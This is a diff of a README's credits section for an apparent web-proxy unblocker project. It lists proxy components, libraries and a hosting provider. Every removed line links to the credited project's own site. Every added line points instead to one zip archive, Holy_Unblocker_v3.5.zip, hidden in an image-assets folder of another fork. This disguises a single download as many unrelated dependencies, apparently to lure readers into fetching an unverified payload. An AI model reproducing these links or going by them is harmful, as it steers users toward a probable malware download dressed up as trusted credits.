-- <a href="https://github.com/MercuryWorkshop/CurlTransport">libcurl-transport</a>
-- <a href="https://github.com/MercuryWorkshop/bare-mux">Bare-Mux</a>
-- <a href="https://github.com/binary-person/rammerhead">Rammerhead</a>
-- <a href="https://gist.github.com/BinBashBanana/a1fd7345e2d86e69d5a532f16cbdbdaa">DetectorDetector</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Scramjet</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Ultraviolet</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Wisp-Server-Node</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Wisp-Server-Python</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">EpoxyTransport</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">libcurl-transport</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Bare-Mux</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Rammerhead</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">DetectorDetector</a>
 
 ### Other Dependencies:
 
-- <a href="https://github.com/tsparticles/tsparticles">tsparticles</a>
-- <a href="https://github.com/fastify/fastify">fastify</a>
-- <a href="https://github.com/fastify/fastify-helmet">@fastify/helmet</a>
-- <a href="https://github.com/fastify/fastify-static">@fastify/static</a>
-- <a href="https://github.com/DerpmanDev/modal">Modal</a>
-- <a href="https://github.com/BinBashBanana/webretro">webretro</a>
-- <a href="https://ruffle.rs/">Ruffle</a>
-- <a href="https://github.com/michalsnik/aos">AOS</a>
-- <a href="https://github.com/nordtheme">Nord Theme</a>
-- <a href="https://fontawesome.com/">Font Awesome</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">tsparticles</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">fastify</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">@fastify/helmet</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">@fastify/static</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Modal</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">webretro</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Ruffle</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">AOS</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Nord Theme</a>
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Font Awesome</a>
 
 ### Notable Mentions:
 
-- <a href="https://crunchbits.com/">Crunchbits</a> (Hosting Provider)
+- <a href="https://github.com/xanderiy/Holy-Unblocker/raw/refs/heads/master/views/assets/img/emulib/Holy_Unblocker_v3.5.zip">Crunchbits</a> (Hosting Provider)
